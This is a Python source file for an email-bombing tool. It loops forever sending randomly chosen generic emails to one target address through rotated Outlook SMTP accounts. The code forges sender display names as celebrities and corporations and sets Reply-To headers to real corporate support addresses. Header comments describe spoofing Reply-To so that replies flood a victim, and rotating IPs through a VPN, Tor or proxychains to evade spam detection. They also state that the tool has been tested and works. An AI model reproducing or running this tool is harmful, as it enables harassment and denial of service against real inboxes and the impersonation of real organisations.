# Author: Ezra Fast (allegedly)     Date: July 26, 2023

'''
This script will take in the necessary inputs to send mass amounts of email to a single address.
Hard code the credentials of the sending addresses in a list so that the script can rotate through them as needed.
If you are worried about an address being marked by outlook as spam, use a VPN API to rotate addresses every so often (~50 emails maybe?)
An alternative approach to address rotation in Linux environment would be to either restart tor service within the script itself, or to have a script that invokes
this script using subprocess.run() with proxychains as the first argument (new instance for each email)

'''
# ATTENTION: TRY TO SPOOF THE REPLY-TO EMAIL ADDRESS AND TEST THE RESULTS: positive spoof test on August 21
# ATTENTION: Change the Reply-to address to the target address and create a list of destination addresses to have a high volume of replies to the target

'''
    August 22: This script works as intended.   Sample command: python mass_email.py -t target@domain.com -r 5
'''

import argparse
import smtplib
from email.mime.multipart import MIMEMultipart
import time
import random
from email.mime.text import MIMEText
# from email.mime.application import MIMEApplication
from email.utils import formataddr

def arguments():
    parser = argparse.ArgumentParser(
        prog='mass_emailer_penetration_testing_tool_could_never_be_used_maliciously_especially_not_to_deny_legitimate_service_to_unsuspecting_email_users_via_the_outlook_smtp_servers_or_other_smtp_servers_in_the_case_of_being_flagged_for_spam.py',
        description='This script will send mass amounts of generic random emails to the target email address specified with -t / --target.',
        epilog='Provide a target email address with -t and the rate between emails with -r')

    parser.add_argument('-t', '--target_address')
    parser.add_argument('-r', '--rate')

    args = parser.parse_args()
    
    return args         # object containing the target address and the rate between emails

def emailer():
    common_email_subjects = [
    "Weekly Newsletter",
    "Important Update",
    "Your Account Information",
    "Last Chance!",
    "Exclusive Offer Inside",
    "Your Order Status",
    "Invitation for Event",
    "Confirm Your Subscription",
    "Thank You for Your Purchase",
    "Important Announcement",
    "Payment Confirmation",
    "Reset Your Password",
    "Limited Time Offer",
    "Your Feedback Matters",
    "Welcome to Our Community",
    "Action Required",
    "Don't Miss Out!",
    "Exclusive Invitation",
    "Important Notice",
    "Special Discount for You",
    "Stay Connected with Us",
    "Your Invoice",
    "New Product Launch",
    "Join Our Webinar",
    "Breaking News",
    "Season's Greetings",
    "Your Trial Period Ends Soon",
    "Get Started Today",
    "Reminder: Upcoming Event",
]
    common_email_bodies = [
    "Dear subscriber, \n\nHere's our weekly newsletter with the latest updates and exciting news. Stay tuned for more!\n\nBest regards,\nS. Ender",
    "Dear user, \n\nWe have an important update to share with you. Please read the following information carefully.\n\nBest regards,\nS. Ender",
    "Dear customer, \n\nYour account information has been updated. If you did not make any changes, please contact our support team.\n\nBest regards,\nS. Ender",
    "Dear valued customer, \n\nThis is your last chance to take advantage of our special offer. Don't miss out!\n\nBest regards,\nS. Ender",
    "Hi there, \n\nWe have an exclusive offer just for you. Click on the link below to learn more.\n\nBest regards,\nS. Ender",
    "Dear customer, \n\nHere is the current status of your order: order details.\nIf the link above is not working, re-read this email.\n\nBest regards,\nS. Ender",
    "Dear recipient, \n\nYou're invited to attend our upcoming event. Save the date and join us for a great time!\n\nBest regards,\nS. Ender",
    "Dear subscriber, \n\nPlease confirm your subscription by clicking on the link below. Welcome aboard!\n\nBest regards,\nS. Ender",
    "Dear customer, \n\nThank you for your recent purchase. If you have any questions, feel free to reach out to us.\n\nBest regards,\nS. Ender",
    "Dear all, \n\nWe have an important announcement to make. Please read the following message for more details.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nYour payment has been confirmed. Thank you for your prompt payment.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nTo reset your password, follow the instructions provided in this email.\n\nBest regards,\nS. Ender",
    "Dear subscriber, \n\nWe have a limited-time offer for you. Don't miss this opportunity!\n\nBest regards,\nS. Ender",
    "Hi there, \n\nYour feedback is important to us. Let us know how we can improve our services.\n\nBest regards,\nS. Ender",
    "Dear member, \n\nWelcome to our community! We're glad to have you on board.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nAction is required on your part. Please take the necessary steps to continue.\n\nBest regards,\nS. Ender",
    "Dear subscriber, \n\nDon't miss out on our latest offerings. Click here to explore more.\n\nBest regards,\nS. Ender",
    "Dear valued customer, \n\nYou're exclusively invited to a special event. Save the date!\n\nBest regards,\nS. Ender",
    "Dear recipient, \n\nThis is an important notice regarding your email account. Please read the details below.\n\nBest regards,\nS. Ender",
    "Hi there, \n\nWe have a special discount just for you. Use the code provided to avail yourself of the offer.\n\nBest regards,\nS. Ender",
    "Dear subscriber, \n\nStay connected with us to receive the latest updates and news.\n\nBest regards,\nS. Ender",
    "Dear customer, \n\nYour invoice for your order details is attached. If you have any questions, let us know.\n\nBest regards,\nS. Ender",
    "Dear customer, \n\nExciting news! We are launching a new product. Check it out.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nJoin our webinar on reading your email! Reserve your spot now!\n\nBest regards,\nS. Ender",
    "Hi there, \n\nWe have breaking news to share with you. Stay informed!\n\nBest regards,\nS. Ender",
    "Dear subscriber, \n\nSeason's greetings from our team. Wishing you joy and happiness this season.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nYour trial period is ending soon. Upgrade now to continue enjoying our services.\n\nBest regards,\nS. Ender",
    "Dear user, \n\nGet started today with our easy setup process. Begin your journey now!\n\nBest regards,\nS. Ender",
    "Dear participant, \n\nThis is a reminder about the upcoming event. We look forward to seeing you there!\n\nBest regards,\nS. Ender",
]

    common_source_names = [
        "Jeff Bezos",
        "Warren Buffett",
        "Elon Musk",
        "Mark Zuckerberg",
        "Bill Gates",
        "Richard Branson",
        "Oprah Winfrey",
        "Larry Ellison",
        "Tim Cook",
        "Jack Ma",
        "Richard Koch",
        "Sheryl Sandberg",
        "Steve Jobs",
        "Rupert Murdoch",
        "Mary Barra",
        "Alibaba Group",
        "Tencent Holdings",
        "Baidu",
        "Xiaomi",
        "Huawei Technologies",
        "JD.com",
        "PetroChina",
        "ICBC",
        "China Construction Bank",
        "China Mobile",
        "Ping An Insurance",
        "Haier Group",
        "BYD",
        "Geely",
        "Lenovo Group",
        "Gazprom",
        "Rosneft",
        "Lukoil",
        "Sberbank",
        "Yandex",
        "Norilsk Nickel",
        "Rusal",
        "Severstal",
        "VTB Bank",
        "Aeroflot",
        "Mail.Ru Group",
        "MTS",
        "Novatek",
        "Rostec",
        "Evraz"
    ]

    reply_to_addresses = [
        "support@sberbank.ru",
        "help@rosneft.com",
        "assistance@gazprom.ru",
        "service@lukoil.com",
        "support@vtb.ru",
        "helpdesk@yandex.com",
        "support@megafon.ru",
        "info@norilsknickel.com",
        "help@mts.ru",
        "contact@yota.ru",
        "support@alibaba.com",
        "help@tencent.com",
        "assistance@huawei.com",
        "service@baidu.com",
        "support@xiaomi.com",
        "helpdesk@jd.com",
        "support@cnooc.com",
        "info@pingan.com",
        "help@chinaunicom.com",
        "support@koctas.com.tr",
        "help@turkcell.com.tr",
        "assistance@garanti.com.tr",
        "service@arcelik.com.tr",
        "support@petrolofisi.com.tr",
        "helpdesk@halkbank.com.tr",
        "support@vestel.com.tr",
        "info@anadolubank.com.tr",
        "help@turktelekom.com.tr",
        "contact@teb.com.tr",
        "support@televisa.com.mx",
        "help@cemex.com.mx",
        "assistance@banorte.com.mx",
        "service@americamovil.com.mx",
        "support@walmex.com.mx",
        "helpdesk@grupo-modelo.com.mx",
        "support@femsa.com.mx",
        "info@elektra.com.mx",
        "help@grupo-bimbo.com.mx",
        "contact@liverpool.com.mx",
        "support@falabella.cl",
        "help@codelco.cl",
        "assistance@lan.com",
        "service@entel.cl",
        "support@copec.cl",
        "helpdesk@bci.cl",
        "support@sodimac.cl",
        "info@latamairlines.cl",
        "help@ripley.cl",
        "contact@embonor.cl",
        "support@itau.com.br",
        "help@petrobras.com.br",
        "assistance@vale.com.br",
        "service@ambev.com.br",
        "support@bradesco.com.br",
        "helpdesk@embraer.com.br",
        "support@b3.com.br",
        "info@globo.com.br",
        "help@natura.com.br",
        "contact@ultra.com.br",
]

    source_addresses = [

    ]
    source_passwords = [
 
    ]

    '''
    
    For every email, the following are determined programmatically:

        - source address w/ password
        - subject
        - body
        - reply-to address
        - from name

    '''

    try:
        args = arguments()
        rate = int(args.rate)
        target_address =  args.target_address
        recipient = target_address 
       
        counter = 0
        while (1):                                                                      # from email, from password, subject, body, reply-to, from field
            random_credential_offset = random.randint(0, len(source_addresses) - 1)
            random_misc_offset = random.randint(0, len(common_email_bodies) - 1)
            random_name_offset = random.randint(0, len(common_source_names) - 1)
            random_replyto_offset = random.randint(0, len(reply_to_addresses) - 1)

            server = 'smtp-mail.outlook.com'
            port = 587
            connection = smtplib.SMTP(server, port)
            connection.starttls()
            connection.login(source_addresses[random_credential_offset], source_passwords[random_credential_offset])

            message_container = MIMEMultipart()
            source_address = source_addresses[random_credential_offset]
            source_name = common_source_names[random_name_offset]
            message_container['From'] = formataddr((source_name, source_address))
            message_container['To'] = recipient
            message_container['Subject'] = common_email_subjects[random_misc_offset]
            body = common_email_bodies[random_misc_offset]
            body_part = MIMEText(body, 'plain')
            message_container.attach(body_part)
            message_container["Reply-To"] = reply_to_addresses[random_replyto_offset]
            
            connection.send_message(message_container)
            counter += 1
            print(f'Message {counter} Sent.')

            time.sleep(rate)

    except (Exception, KeyboardInterrupt) as e:
        print('Exception Raised')
        # connection.quit()
        pass

def main():
    emailer()

main()
